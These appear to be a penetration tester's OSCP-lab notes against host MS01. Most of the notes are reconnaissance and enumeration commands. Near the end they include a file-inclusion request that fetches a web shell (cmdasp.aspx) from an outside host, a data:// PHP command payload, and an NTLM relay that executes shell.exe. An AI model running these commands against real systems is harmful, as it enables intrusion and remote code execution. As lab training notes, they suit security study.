```
nmap 192.168.194.147 192.168.194.149-151
```

.147
```
nmap -sT -A MS01.oscp.exam
whatweb MS01.oscp.exam:8080
whatweb MS01.oscp.exam:8000

# due to the proxy, we cannot do anything with the IP:8080 (400 error), so get the DNS name from the output of nmap (8443 port shows cert dns name) and create a hostfile entry for it
gobuster dir -u http://MS01.oscp.exam:8000 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --url http://MS01.oscp.exam:8080/home --filter-status=200

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://MS01.oscp.exam/mvc/FUZZ

nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.194.147

enum4linux -n 192.168.194.147

nmap --script=smb-enum* --script-args=unsafe=1 -T5 192.168.194.147
smbclient -p 5040 -L 192.168.194.147

nmap 192.168.194.147 --script=msrpc-enum

nbtstat -a 192.168.194.147

# we find that the url param seems to be vulerable to some sort of file inclusion vuln
curl -X POST --data 'name=test&mail=test@test.com&url=http://192.168.45.219/cmdasp.aspx' http://MS01.oscp.exam:8080/home/signup

curl -X POST --data "name=test&mail=test@test.com&url=data://text/plain,<?php%20echo%20system('ls');?>" http://MS01.oscp.exam:8080/home/signup


sudo impacket-ntlmrelayx --no-http-server -smb2support -t MS01.oscp.exam -c shell.exe

sudo impacket-smbserver -t MS01.oscp.exam
```